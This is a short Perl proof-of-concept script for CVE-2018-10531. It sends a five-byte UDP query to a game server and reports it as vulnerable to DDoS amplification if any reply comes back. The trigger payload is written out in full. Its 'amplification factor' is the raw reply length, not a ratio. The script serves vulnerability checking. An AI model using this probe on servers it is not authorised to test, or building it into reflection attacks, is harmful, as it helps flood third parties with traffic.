#!/usr/bin/perl

# Original Author: https://www.xlabs.com.br/blog/cve-2018-10531-americas-army-proving-grounds-ddos-amplification/

use 5.010;
use strict;
use warnings;
use IO::Socket::INET;
use IO::Socket::Timeout;

sub main {
	my $ip = $ARGV[0];
	my $port = $ARGV[1];

  	my $socket = IO::Socket::INET -> new (
    	PeerAddr => $ip,
    	PeerPort => $port,
    	Proto => 'udp',
    	Timeout => 1
  	);

  	IO::Socket::Timeout -> enable_timeouts_on($socket);

 	my $data = "\xff\xff\xff\xff\x00";

  	$socket -> send($data) or die "Error on send Payload...\n";
  	$socket -> read_timeout(2);

  	my $output = <$socket>;
  	close($socket);

  	if (length($output) == 0) {
    	print "[!] $ip:$port Not Vulnerable\n\n";
  	}

  	else {
   		my $amp_factor = length($output);
   		print "[+] $ip:$port Vulnerable [Amplification Factor $amp_factor Bytes]\n\n";
  	}
}

main();
exit;
